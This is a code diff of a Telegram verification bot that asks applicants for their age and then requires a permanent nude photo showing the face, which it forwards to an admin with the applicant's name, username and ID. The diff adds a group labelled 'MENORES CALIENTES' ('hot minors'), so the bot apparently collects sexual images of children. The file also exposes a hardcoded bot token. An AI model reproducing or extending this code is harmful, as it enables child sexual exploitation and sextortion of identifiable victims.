@@ -20,97 +20,111 @@ TOKEN = "8797013447:AAHcfHxJC9H7RqfiegnUe2CMWCReUY32ozc"
 
 pending_users = {}
 
-GROUP_ID = -1003968636484
+GROUP_IDS = [
+    -1003968636484,   # LOS COMUNES
+    -1003936428271,   # MENORES CALIENTES
+]
+
 ADMIN_ID = 8011642705
 
 TEXTS = {
     "es": {
         "welcome": (
             "🔒 Bienvenido al sistema de verificación de LOS COMUNES.\n\n"
-    "Este proceso es obligatorio para ingresar al grupo.\n\n"
 
-    "La información enviada será revisada manualmente por una persona.\n"
-    "No envíes información falsa, memes, contenido inválido o cualquier cosa fuera de los requisitos.\n\n"
+            "Este proceso es obligatorio para ingresar al grupo.\n\n"
 
-    "Las solicitudes inválidas serán rechazadas y el usuario podrá ser baneado de la federación de grupos.\n\n"
-            
-            "PARA COMENZAR DIME TU EDAD👀"
+            "La información enviada será revisada manualmente por una persona.\n"
+            "No envíes información falsa, memes, contenido inválido o cualquier cosa fuera de los requisitos.\n\n"
+
+            "Las solicitudes inválidas serán rechazadas y el usuario podrá ser baneado de la federación de grupos.\n\n"
+
+            "PARA COMENZAR DECÍ TU EDAD 👀"
         ),
 
-        "ask_video": (
+        "ask_photo": (
             "Perfecto.\n\n"
-            "Ahora enviá una foto DESNUDO permanente parado "
-            "haciendo estas señas con las manos:\n"
+
+            "Ahora enviá una FOTO DESNUDO permanente, parado CON CARA,\n"
+            "haciendo estas señas con las manos:\n\n"
+
             "👌🤟"
         ),
 
-        "invalid_video": "Tenés que enviar una foto valida.",
+        "invalid_photo": "Tenés que enviar una foto válida.",
 
-        "sent": "Solicitud enviada para revisión.",
+        "sent": "✅ Solicitud enviada para revisión.",
 
-        "approved": "Tu solicitud fue aprobada.",
+        "approved": "✅ Tu solicitud fue aprobada.",
 
-        "rejected": "Tu solicitud fue rechazada.",
+        "rejected": "❌ Tu solicitud fue rechazada.",
     },
 
     "en": {
         "welcome": (
             "🔒 Welcome to the LOS COMUNES verification system.\n\n"
-    "This process is mandatory to join the group.\n\n"
 
-    "The submitted information will be manually reviewed by a real person.\n"
-    "Do not send fake information, memes, invalid content or anything unrelated to the requirements.\n\n"
+            "This process is mandatory to join the group.\n\n"
 
-    "Invalid requests will be rejected and the user may be banned from the federation of groups.\n\n"
-            
+            "The submitted information will be manually reviewed by a real person.\n"
+            "Do not send fake information, memes, invalid content or anything unrelated to the requirements.\n\n"
+
+            "Invalid requests will be rejected and the user may be banned from the federation of groups.\n\n"
+
             "TO BEGIN, TELL YOUR AGE 👀"
         ),
 
-        "ask_video": (
+        "ask_photo": (
             "Perfect.\n\n"
-            "Now send a permanent  NAKED PHOTO standing up "
-            "doing these hand signs:\n"
+
+            "Now send a permanent NAKED PHOTO standing up WITH your FACE visible,\n"
+            "doing these hand signs:\n\n"
+
             "👌🤟"
         ),
 
-        "invalid_video": "You must send a valid photo.",
+        "invalid_photo": "You must send a valid photo.",
 
-        "sent": "Request sent for review.",
+        "sent": "✅ Request sent for review.",
 
-        "approved": "Your request was approved.",
+        "approved": "✅ Your request was approved.",
 
-        "rejected": "Your request was rejected.",
+        "rejected": "❌ Your request was rejected.",
     },
 
     "pt": {
         "welcome": (
-             "🔒 Bem-vindo ao sistema de verificação do LOS COMUNES.\n\n"
-    "Este processo é obrigatório para entrar no grupo.\n\n"
+            "🔒 Bem-vindo ao sistema de verificação do LOS COMUNES.\n\n"
 
-    "As informações enviadas serão revisadas manualmente por uma pessoa real.\n"
-    "Não envie informações falsas, memes, conteúdo inválido ou qualquer coisa fora dos requisitos.\n\n"
+            "Este processo é obrigatório para entrar no grupo.\n\n"
 
-    "Solicitações inválidas serão rejeitadas e o usuário poderá ser banido da federação de grupos.\n\n"
-            
-            "PARA COMEçAR, DIGA SUA IDADE👀"
+            "As informações enviadas serão revisadas manualmente por uma pessoa real.\n"
+            "Não envie informações falsas, memes, conteúdo inválido ou qualquer coisa fora dos requisitos.\n\n"
+
+            "Solicitações inválidas serão rejeitadas e o usuário poderá ser banido da federação de grupos.\n\n"
+
+            "PARA COMEÇAR, DIGA SUA IDADE 👀"
         ),
 
-        "ask_video": (
+        "ask_photo": (
             "Perfeito.\n\n"
-            "Agora envie uma FOTO/PIC NU permanente em pé "
-            "fazendo estes sinais:\n"
+
+            "Agora envie uma FOTO NUO permanente em pé, COM o ROSTO visível,\n"
+            "fazendo estes sinais com as mãos:\n\n"
+
             "👌🤟"
         ),
 
-        "invalid_video": "Você precisa enviar uma pic válido.",
+        "invalid_photo": "Você precisa enviar uma foto válida.",
 
-        "sent": "Solicitação enviada para revisão.",
+        "sent": "✅ Solicitação enviada para revisão.",
 
-        "approved": "Sua solicitação foi aprovada.",
+        "approved": "✅ Sua solicitação foi aprovada.",
 
-        "rejected": "Sua solicitação foi rejeitada.",
+        "rejected": "❌ Sua solicitação foi rejeitada.",
     }
 }
+
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
@@ -129,6 +143,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=reply_markup
     )
 
+
 async def language_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     query = update.callback_query
@@ -139,20 +154,31 @@ async def language_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     user = query.from_user
 
-    pending_users[user.id] = {
-        "step": "age",
-        "lang": lang,
-        "username": user.username or user.first_name,
-    }
+    if user.id not in pending_users:
+        pending_users[user.id] = {}
 
-    # Editar el mensaje original en vez de mandar otro
+    pending_users[user.id]["step"] = "age"
+    pending_users[user.id]["lang"] = lang
+    pending_users[user.id]["username"] = user.username
+    pending_users[user.id]["name"] = user.full_name
+
     await query.edit_message_text(
         TEXTS[lang]["welcome"]
     )
 
+
 async def join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     user = update.chat_join_request.from_user
+    group_id = update.chat_join_request.chat.id
+
+    # Ignorar grupos no autorizados
+    if group_id not in GROUP_IDS:
+        return
+
+    pending_users[user.id] = {
+        "group_id": group_id
+    }
 
     keyboard = [
         [
@@ -171,14 +197,11 @@ async def join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
             text=(
                 "🔒 LOS COMUNES Verification Bot\n\n"
 
-                "Este bot realiza la verificación obligatoria "
-                "para ingresar al grupo LOS COMUNES.\n\n"
+                "Este bot realiza la verificación obligatoria para ingresar al grupo.\n\n"
 
-                "This bot performs the mandatory verification "
-                "required to join LOS COMUNES.\n\n"
+                "This bot performs the mandatory verification required to join the group.\n\n"
 
-                "Este bot realiza a verificação obrigatória "
-                "para entrar no grupo LOS COMUNES.\n\n"
+                "Este bot realiza a verificação obrigatória para entrar no grupo.\n\n"
 
                 "Seleccioná tu idioma para continuar.\n"
                 "Select your language to continue.\n"
@@ -187,8 +210,8 @@ async def join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=reply_markup
         )
 
-    except:
-        print("El usuario no inició el bot.")
+    except Exception as e:
+        print(f"No se pudo enviar mensaje: {e}")
 
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -202,8 +225,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user_id not in pending_users:
         return
 
-    step = pending_users[user_id]["step"]
-    lang = pending_users[user_id]["lang"]
+    step = pending_users[user_id].get("step")
+    lang = pending_users[user_id].get("lang", "es")
 
     # PEDIR EDAD
     if step == "age":
@@ -211,7 +234,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not update.message.text:
 
             await update.message.reply_text(
-                "Please send your age using numbers only."
+                "Please send only your age in numbers."
             )
             return
 
@@ -226,7 +249,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         pending_users[user_id]["step"] = "photo"
 
         await update.message.reply_text(
-            TEXTS[lang]["ask_video"]
+            TEXTS[lang]["ask_photo"]
         )
 
     # PEDIR FOTO
@@ -235,15 +258,26 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if update.message.photo:
 
             age = pending_users[user_id]["age"]
-            username = pending_users[user_id]["username"]
+
+            username = pending_users[user_id].get("username")
+            name = pending_users[user_id].get("name")
+
+            username_text = (
+                f"@{username}"
+                if username else "Sin @username"
+            )
 
             await context.bot.send_photo(
                 chat_id=ADMIN_ID,
                 photo=update.message.photo[-1].file_id,
                 caption=(
-                    f"Solicitud nueva\n\n"
-                    f"Usuario: {username}\n"
-                    f"Edad: {age}\n\n"
+                    f"📥 Solicitud nueva\n\n"
+
+                    f"👤 Nombre: {name}\n"
+                    f"🔗 Usuario: {username_text}\n"
+                    f"🆔 ID: {user_id}\n"
+                    f"🎂 Edad: {age}\n\n"
+
                     f"/aprobar {user_id}\n"
                     f"/rechazar {user_id}"
                 )
@@ -258,7 +292,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
 
             await update.message.reply_text(
-                TEXTS[lang]["invalid_video"]
+                TEXTS[lang]["invalid_photo"]
             )
 
 
@@ -269,8 +303,10 @@ async def aprobar(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     user_id = int(context.args[0])
 
+    group_id = pending_users[user_id]["group_id"]
+
     await context.bot.approve_chat_join_request(
-        chat_id=GROUP_ID,
+        chat_id=group_id,
         user_id=user_id
     )
 
@@ -291,8 +327,10 @@ async def rechazar(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     user_id = int(context.args[0])
 
+    group_id = pending_users[user_id]["group_id"]
+
     await context.bot.decline_chat_join_request(
-        chat_id=GROUP_ID,
+        chat_id=group_id,
         user_id=user_id
     )
 
